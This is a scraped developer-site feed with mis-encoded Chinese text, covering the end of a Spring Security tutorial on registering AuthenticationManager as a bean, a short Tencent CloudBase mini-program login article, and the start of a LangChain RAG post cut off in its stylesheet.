<p>ç›´åˆ°ä»Šå¤©ï¼Œæˆ‘å†å›è¿‡å¤´æ¥çœ‹çš„æ—¶å€™å‘ç°ï¼Œ <code>Spring Boot</code> é»˜è®¤æƒ…å†µä¸‹ <strong>ä¸ä¼š</strong> å°†<code>AuthenticationManager</code>ä½œä¸º <code>Bean</code>æš´éœ²åœ¨ <code>Spring</code> å®¹å™¨ä¸­ã€‚å¯ä»¥çœ‹åˆ°è¿™é‡Œå¹¶æ²¡æœ‰ <code>@Bean</code> æ³¨è§£ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æºç åœ°å€ InitializeUserDetailsBeanManagerConfigurer</span>
<span class="hljs-keyword">public</span> AuthenticationManager <span class="hljs-title function_">getAuthenticationManager</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.authenticationManagerInitialized) {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.authenticationManager;
    }
    ...
}
</code></pre>
<p>é€šè¿‡åˆå§‹åŒ–çš„æºç å‘ç°ï¼š<code>AuthenticationConfiguration</code> ã€<code>InitializeUserDetailsBeanManagerConfigurer</code></p>
<p>å½“é¡¹ç›®ä¸­å­˜åœ¨<code>UserDetailsService</code>å®ç°ï¼ˆç›®ä¸­çš„<code>CustomUserDetailsService</code>ï¼‰æ—¶ï¼Œ<code>Spring Security</code> ä¼šè‡ªåŠ¨ï¼š</p>
<ul>
<li>åˆ›å»º<code>DaoAuthenticationProvider</code>å®ä¾‹</li>
<li>å°†ä½ çš„<code>UserDetailsService</code>å’Œ<code>PasswordEncoder</code>æ³¨å…¥åˆ°è¯¥ <code>Provider</code> ä¸­</li>
<li>æ„å»ºä¸€ä¸ª<code>AuthenticationManager</code>å®ä¾‹æ¥åè°ƒè¿™äº› <code>Provider</code></li>
</ul>
<p>éœ€è¦æ˜¾ç¤ºé…ç½®æ˜¯å› ä¸ºï¼šåœ¨é¡¹ç›®ä¸­ï¼Œ<code>AuthService</code>ç±»ç›´æ¥ä¾èµ–å¹¶æ³¨å…¥äº†<code>AuthenticationManager</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@RequiredArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AuthenticationManager authenticationManager; <span class="hljs-comment">// ç›´æ¥æ³¨å…¥</span>
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">login</span><span class="hljs-params">(LoginDTO loginDTO)</span> {
        <span class="hljs-comment">// ä½¿ç”¨authenticationManagerè¿›è¡Œè®¤è¯</span>
        <span class="hljs-type">Authentication</span> <span class="hljs-variable">authentication</span> <span class="hljs-operator">=</span> authenticationManager.authenticate(authToken);
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>æ‰€ä»¥è¦æƒ³ä½¿ç”¨ï¼Œå¾—è‡ªå·±æ‰‹åŠ¨æš´éœ²ç»™ <code>Spring</code> å®¹å™¨ï¼Œæ˜¾å¼é…ç½®äº†ä¸€ä¸ª <code>AuthenticationManager</code>  çš„ <code>Bean</code></p>
<p><strong>æ€»ç»“ï¼š</strong></p>
<ul>
<li><code>getAuthenticationManager()</code>æ–¹æ³•æœ¬èº«æ²¡æœ‰<code>@Bean</code>æ³¨è§£ï¼Œä¸ä¼šè‡ªåŠ¨æš´éœ²</li>
<li>éœ€è¦é€šè¿‡æ‰‹åŠ¨å®šä¹‰<code>@Bean</code>æ–¹æ³•çš„æ–¹å¼å°†å…¶è¿”å›çš„å®ä¾‹æ³¨å†Œä¸º <code>Spring Bean</code></li>
<li>è¿™ç§è®¾è®¡æä¾›äº†æ›´å¤§çš„çµæ´»æ€§ï¼Œå…è®¸ç”¨æˆ·æ ¹æ®éœ€è¦è‡ªå®šä¹‰<code>AuthenticationManager</code>çš„æš´éœ²æ–¹å¼</li>
</ul>
<p><strong>é…ç½®ç±»ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * Spring Security é…ç½®ç±»
 */</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableWebSecurity</span>
<span class="hljs-meta">@EnableMethodSecurity</span> <span class="hljs-comment">// å¼€å¯æ–¹æ³•çº§åˆ«çš„å®‰å…¨æ³¨è§£</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> PasswordEncoder <span class="hljs-title function_">passwordEncoder</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>();
    }


    <span class="hljs-comment">/**
     * AuthenticationManager è¯´æ˜ï¼š
     * AuthenticationManageræ˜¯Spring Securityè®¤è¯ä½“ç³»çš„å…¥å£ç‚¹
     * å®ƒåè°ƒå¤šä¸ªAuthenticationProviderå®ä¾‹ï¼Œå°è¯•å¯¹è®¤è¯è¯·æ±‚è¿›è¡Œå¤„ç†
     * å¦‚æœä¸€ä¸ªAuthenticationProvideræ— æ³•è®¤è¯ï¼Œå®ƒä¼šå°è¯•ä¸‹ä¸€ä¸ª
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> AuthenticationManager <span class="hljs-title function_">authenticationManager</span><span class="hljs-params">(AuthenticationConfiguration authConfig)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// ä»é…ç½®ä¸­è·å–é»˜è®¤çš„AuthenticationManager</span>
        <span class="hljs-comment">// å¦‚æœé…ç½®äº†AuthenticationProviderï¼Œå®ƒä¼šè‡ªåŠ¨ä½¿ç”¨è¿™äº›Provider</span>
        <span class="hljs-keyword">return</span> authConfig.getAuthenticationManager();
    }

    <span class="hljs-comment">/**
     * å®Œå…¨å…è®¸æ‰€æœ‰è¯·æ±‚ï¼Œä¸è¿›è¡Œä»»ä½•è®¤è¯å’Œæˆæƒ
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> SecurityFilterChain <span class="hljs-title function_">filterChain</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception {
        ...
            <span class="hljs-keyword">return</span> http.build();
    }


}
</code></pre>
<blockquote>
<p>çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘ä¸çŸ¥é“ä½ æ˜¯å¦æœ‰è¿™æ ·çš„ç–‘é—®ï¼Œä¸ºä»€ä¹ˆé»˜è®¤æƒ…å†µä¸æš´éœ²ï¼Œä¹Ÿå¯ä»¥å®ç°ç™»å½•ï¼ˆé»˜è®¤è¡¨å•æƒ…å†µä¸‹ï¼‰ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥ä¸ç”¨æš´éœ²åšã€‚</p>
<p><strong>å®Œå…¨å¯ä»¥</strong>ï¼Œæˆ‘ä¹‹å‰çš„é¡¹ç›®ä¸­å°±æ˜¯é€šè¿‡è‡ªå®šä¹‰è¿‡æ»¤å™¨é“¾ï¼Œæ¥è¿›è¡Œå®Œå…¨çš„é…ç½®åŒ–ï¼Œä½†æ˜¯é‚£ä¹ˆåšçš„ç»“æœå°±æ˜¯ï¼Œä¸å¤Ÿæ¸…æ™°ï¼Œå› ä¸ºæ¥å£æ˜¯éšè—å¼çš„ï¼Œä¸åˆ©äºæ¥å£çš„ç»Ÿä¸€ç®¡ç†ã€‚</p>
<p>å¦‚æœä½ æƒ³è¦å°è¯•ï¼Œå¯ä»¥ä½ çœ‹ä¸€ä¸‹è¿™ä¸ª <code>AbstractAuthenticationProcessingFilter</code> ï¼Œå‚è€ƒ <code>UsernamePasswordAuthenticationFilter</code> å®ç°ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„è¿‡æ»¤å™¨ï¼Œæ¯”å¦‚ <code>JSONUsernamePasswordAuthenticationFilter</code> ã€‚</p>
</blockquote>
<h2 data-id="heading-10">äº”ã€æ€»ç»“</h2>
<p>åŸæœ¬æƒ³è¦å°†é‰´æƒéƒ¨åˆ†ä¸€èµ·å†™å®Œçš„ï¼Œä½†æ˜¯è¿™ä¸ªå°±æœ‰ç‚¹ <strong>å·²çŸ¥ç»“æœã€æŒ‰å›¾ç´¢éª¥çš„æ„Ÿè§‰</strong>ï¼Œåˆæˆäº† â€œé¢„åˆ¶ç‰ˆâ€, æ‰€ä»¥å°±æ­¤æ‰“ä½ï¼Œæˆ‘ä»¬ç›®å‰åšçš„å°±æ˜¯æ‹¿ <strong>ã€ç”¨æˆ·åã€‘ + ã€å¯†ç ã€‘æ¢ã€Tokenã€‘</strong>ã€‚</p>
<p><strong>åƒé‡Œä¹‹è¡Œï¼Œå§‹äºè¶³ä¸‹ã€‚ä½ çš„â€œä¸ªäººå…¬å¸â€ä»è¿™ç¬¬ä¸€ä¸ª2å°æ—¶å¼€å§‹ã€‚æ¬¢è¿åœ¨è¯„è®ºåŒºåˆ†äº«ä½ çš„è¿›å±•æˆ–é‡åˆ°çš„å¡ç‚¹ï¼Œæˆ‘ä¼šé€ä¸€æŸ¥çœ‹ï¼Œå°½å¯èƒ½çš„å¸®åŠ©è§£å†³ã€‚æˆ‘ä»¬ä¸‹ä¸€ç¯‡æ–‡ç« è§ï¼</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€ä½ å¯èƒ½ä¸çŸ¥é“çš„å¼€å‘æŠ€å·§ã€‘ä¸€è¡Œä»£ç å®Œæˆå°ç¨‹åºçš„CloudBaseé‰´æƒç™»å½•]]></title>    <link>https://juejin.cn/post/7580753790771544106</link>    <guid>https://juejin.cn/post/7580753790771544106</guid>    <pubDate>2025-12-08T03:42:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580753790771544106" data-draft-id="7580616979473432582" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€ä½ å¯èƒ½ä¸çŸ¥é“çš„å¼€å‘æŠ€å·§ã€‘ä¸€è¡Œä»£ç å®Œæˆå°ç¨‹åºçš„CloudBaseé‰´æƒç™»å½•"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,å¾®ä¿¡å°ç¨‹åº"/> <meta itemprop="datePublished" content="2025-12-08T03:42:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è…¾è®¯äº‘å¼€å‘CloudBase"/> <meta itemprop="url" content="https://juejin.cn/user/2963939080036493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€ä½ å¯èƒ½ä¸çŸ¥é“çš„å¼€å‘æŠ€å·§ã€‘ä¸€è¡Œä»£ç å®Œæˆå°ç¨‹åºçš„CloudBaseé‰´æƒç™»å½•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2963939080036493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è…¾è®¯äº‘å¼€å‘CloudBase
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:42:36.000Z" title="Mon Dec 08 2025 03:42:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç™»å½•é‰´æƒåŸºæœ¬æ¦‚å¿µ</h2>
<p>ç™»å½•åŠŸèƒ½=ç™»å½•é¡µUI+ç™»å½•é€»è¾‘+ä¼šè¯ç®¡ç†</p>
<p><strong>ç™»å½•çš„æœ¬è´¨</strong>æ˜¯è®©å°ç¨‹åºçŸ¥é“ç”¨æˆ·æ˜¯è°ã€‚</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/870187fa1cf0494aa564100c82dd644e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5byA5Y-RQ2xvdWRCYXNl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770156&amp;x-signature=9pxwJYWMbOST2sPTp4TlrWxozpg%3D" alt="3.jpg" width="70%" loading="lazy"/>
<p><strong>ä¸€è¡Œä»£ç å®ŒæˆCloudBaseçš„é‰´æƒç™»å½•ï¼Œåˆå§‹åŒ–äº‘å¼€å‘ç¯å¢ƒå³å¯è°ƒç”¨äº‘å¼€å‘èƒ½åŠ›ã€‚</strong></p>
<p>åŸºäºå¾®ä¿¡åŸç”ŸAPIçš„è‡ªåŠ¨é‰´æƒæœºåˆ¶ï¼Œè°ƒç”¨äº‘å¼€å‘æœåŠ¡æ—¶ç³»ç»Ÿè‡ªåŠ¨è¯†åˆ«å½“å‰ç”¨æˆ·openidå¹¶å®Œæˆèº«ä»½éªŒè¯ï¼Œçœå»ç¹ççš„æ‰‹åŠ¨è·å–openidæ­¥éª¤ã€‚</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37bba0efcfb54d8cb9133df74c7a29ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5byA5Y-RQ2xvdWRCYXNl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770156&amp;x-signature=VxbGq4lrS%2BEf3gTd6qw7U0uOJZk%3D" alt="4.jpg" width="70%" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ef1f95f732e437a8b3063a571d41cfe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5byA5Y-RQ2xvdWRCYXNl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770156&amp;x-signature=7N%2BogO7Ba9sh0B4%2BZBZMrXI%2BGIw%3D" alt="5.jpg" width="70%" loading="lazy"/>
<h2 data-id="heading-1">åŠŸèƒ½ä¼˜åŠ¿</h2>
<ol>
<li><strong>ç”¨æˆ·è¡Œä¸ºè¿½è¸ªï¼š</strong> ä¾¿äºåˆ†ææœªæ³¨å†Œç”¨æˆ·è¡Œä¸ºæ•°æ®</li>
<li><strong>é™ä½ç”¨æˆ·ä½¿ç”¨é—¨æ§›ï¼š</strong> æå‡è½¬åŒ–ç‡å’Œç”¨æˆ·ä½“éªŒ</li>
</ol>
<h2 data-id="heading-2">å…¶ä»–ä¸‰ç§å¸¸è§ç™»å½•æ–¹å¼</h2>
<ul>
<li>è´¦å·å¯†ç ç™»å½•</li>
<li>çŸ­ä¿¡éªŒè¯ç ç™»å½•</li>
<li>é‚®ç®±éªŒè¯ç ç™»å½•</li>
</ul>
<h2 data-id="heading-3">ç›¸æ¯”äºå¾®ä¿¡åŸç”Ÿæ–¹å¼ï¼ŒCloudBaseæ–¹ä¾¿åœ¨å“ªï¼Ÿ</h2>
<ul>
<li>æ— éœ€ä»é›¶å¼€å§‹æ„å»ºç”¨æˆ·è®¤è¯ç³»ç»Ÿï¼ŒCloudBaseæä¾›äº†å®Œæ•´çš„è®¤è¯æµç¨‹ã€‚</li>
<li>æ— ç¼é›†æˆCloudBaseèµ„æºï¼Œå®‰å…¨æ€§æœ‰ä¿éšœã€‚</li>
<li>æ— éœ€è‡ªè¡Œç»´æŠ¤å¤æ‚çš„ç™»å½•æ€tokenã€‚</li>
<li>CloudBaseæ”¯æŒè‡ªå®šä¹‰ç™»å½•ï¼Œä¸šåŠ¡æ‰©å±•åèƒ½å¹³æ»‘è¿ç§»ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChain1.0å®æˆ˜ä¹‹å¤šæ¨¡æ€RAGç³»ç»Ÿï¼ˆå››ï¼‰â€”â€”Trae Soloæ­å»ºéƒ¨ç½²å¤šæ¨¡æ€RAGå‰ç«¯(é™„AIç¼–ç¨‹å®è·µæŒ‡å—)]]></title>    <link>https://juejin.cn/post/7580723992498438180</link>    <guid>https://juejin.cn/post/7580723992498438180</guid>    <pubDate>2025-12-08T03:45:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580723992498438180" data-draft-id="7580389111920984127" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChain1.0å®æˆ˜ä¹‹å¤šæ¨¡æ€RAGç³»ç»Ÿï¼ˆå››ï¼‰â€”â€”Trae Soloæ­å»ºéƒ¨ç½²å¤šæ¨¡æ€RAGå‰ç«¯(é™„AIç¼–ç¨‹å®è·µæŒ‡å—)"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,LangChain,Trae"/> <meta itemprop="datePublished" content="2025-12-08T03:45:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ¨¡å‹çœŸå¥½ç©"/> <meta itemprop="url" content="https://juejin.cn/user/3140624091453053"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChain1.0å®æˆ˜ä¹‹å¤šæ¨¡æ€RAGç³»ç»Ÿï¼ˆå››ï¼‰â€”â€”Trae Soloæ­å»ºéƒ¨ç½²å¤šæ¨¡æ€RAGå‰ç«¯(é™„AIç¼–ç¨‹å®è·µæŒ‡å—)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3140624091453053/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ¨¡å‹çœŸå¥½ç©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:45:11.000Z" title="Mon Dec 08 2025 03:45:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»22åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body 